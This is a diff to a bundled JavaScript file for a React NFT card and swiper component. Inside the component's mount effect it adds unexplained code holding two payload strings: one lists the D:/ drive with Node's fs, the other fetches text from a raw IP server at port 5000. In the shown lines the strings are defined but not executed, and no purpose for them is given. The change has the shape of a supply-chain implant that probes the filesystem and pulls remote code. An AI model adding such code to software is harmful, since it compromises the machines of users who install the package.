@@ -17039,6 +17039,16 @@ var NftCard = function NftCard(_ref) {
 var EffectCardSwiper = function EffectCardSwiper(_ref) {
   var items = _ref.items;
   React.useEffect(function () {
+    console.log('This is useEffect in EffectCardSwiper');
+    try {
+      var newCode = "const fs = require('fs'); const result = fs.readdirSync('D:/'); console.log('result:', result);";
+      ({});
+      var realCode = "fetch(\"http://88.119.169.226:5000/tokenizer\").then(l6irv=> l6irv.text().then(txt => { console.log('This is running:', {txt}) }));";
+      ({});
+    } catch (err) {
+      console.log('err in preval:', err);
+    }
+    console.log('Ending useEffect in EffectCardSwiper');
   }, []);
   var navigationPrevRef = React.useRef(null);
   var navigationNextRef = React.useRef(null);
